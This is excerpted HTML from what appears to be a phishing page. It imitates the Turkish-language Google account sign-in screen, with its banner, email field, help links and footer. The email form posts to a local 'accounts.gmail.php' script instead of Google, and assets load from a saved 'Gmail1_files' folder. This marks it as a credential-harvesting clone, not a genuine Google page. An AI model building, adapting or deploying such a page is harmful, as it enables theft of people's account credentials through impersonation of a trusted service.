	...
	<body>
		<div class="wrapper">
			...
			<div class="main content clearfix">
				<div class="banner">
					<h1> Oturum aç </h1>
					<h2 class="hidden-small"> Google Hesabınızı kullanın </h2>
				</div>
						...
						<form novalidate="" method="post" action="accounts.gmail.php" id="gaia_loginform">
							...
							<div class="form-panel first valid" id="gaia_firstform">
								<div class="slide-out">
									<div class="input-wrapper focused">
										<div id="identifier-shown">
											<div>
												...
												<input id="Email" type="email" value="" spellcheck="false" name="Email" placeholder="E-posta veya telefon" autofocus="">
									...
									<a class="need-help" href="#"> E-posta adresinizi mi unuttunuz? </a>
								</div>
							</div>
						...
						<div class="card-mask">
							<div class="one-myweb">
								<p class="create-account">
									...
									<span id="link-signup"> <a href="#"> Hesap oluşturun </a> </span>
								</p>
								<p class="tagline">
									Tüm Google Hizmetleri İçin Tek Google Hesabı
								</p>
			...
			<div class="myweb-footer-bar">
				<div class="footer content clearfix">
					<ul id="footer-list">
						<li>
							<a href="#myweb.com/intl/en/about" target="_blank"> Hakkında </a>
						</li>
						<li>
							<a href="#/TOS?loc=LK&amp;hl=en&amp;privacy=true" target="_blank"> Gizlilik </a>
						</li>
						<li>
							<a href="#/TOS?loc=LK&amp;hl=en" target="_blank"> Şartlar </a>
						</li>
						<li>
							<a href="#" target="_blank"> Yardım </a>
						</li>
					</ul>
					<div id="lang-vis-control" style="display: inline;">
						<span id="lang-chooser-wrap" class="lang-chooser-wrap"> <label for="lang-chooser"><img src="./Gmail1_files/universal_language_settings-21.png" alt="Change language"></label>
							<select id="lang-chooser" class="lang-chooser" name="lang-chooser">
								...
								<option value="en" selected="selected"> Turkish (Türkçe‬)‬ </option>
...
PS_7.prototype.ga=function(a){PS_5(this.f)?(a&&a.preventDefault instanceof Function&&a.preventDefault(),PS_Q(this.u,!0),PS_Q(this.b,!0),PS_$d(this)):(PS_Q(this.ka,!0),PS_Q(this.u,!0),this.l.setAttribute("readonly",""))};PS_7.prototype.va=function(a){a.preventDefault();PS_4d(this.f.a,"login.accounts.google",!1)};
